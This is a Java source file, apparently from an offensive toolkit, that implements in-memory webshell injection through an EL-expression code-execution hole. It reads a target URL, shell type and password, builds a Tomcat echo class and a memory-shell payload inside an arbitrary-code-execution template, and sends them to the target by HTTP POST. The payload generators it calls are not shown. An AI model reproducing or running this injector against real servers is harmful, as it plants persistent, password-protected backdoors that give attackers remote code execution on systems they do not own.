package com.droplab.Controller.elShell.Service;

import com.droplab.Controller.elShell.Common.PayloadFactory;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.Iterator;

/**
 * el表达式shell实现内存马注入
 */
public class elShellMemoryShell extends BugService {
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = null;
                String mType = null;
                String mMiddle = null;
                String path = null;
                String mshellType = null;
                String password = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("mType")) {
                        mType = params.get(key);
                    }else if (key.equals("mMiddle")) {
                        mMiddle = params.get(key);
                    }else if (key.equals("path")) {
                        path = params.get(key);
                    }else if (key.equals("mshellType")) {
                        mshellType = params.get(key);
                    }else if (key.equals("password")) {
                        password = params.get(key);
                    }else if (key.equals("url")) {
                        url = params.get(key);
                    }
                }

                if (!url.equals("")) {
                    String memory = null;
                    String code=null;
                    code = TomcatEcho.instance().getTomcatEchoDefineClass("","");
                    memory = MemroyFactory.instance().getMemoryShell(mType, mMiddle, password, mshellType, path,false);

                    String anyCodeExecute = PayloadFactory.instance().getAnyCodeExecute();
                    code=String.format(anyCodeExecute,code);  //通过回显方式注入，不然会溢出

                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    HashMap paramMap = new HashMap();
                    paramMap.put("Code", code);
                    paramMap.put("dy", memory);
                    Connection.Response post = HttpUtils.post(headers,url,paramMap );
                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage(memory);
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
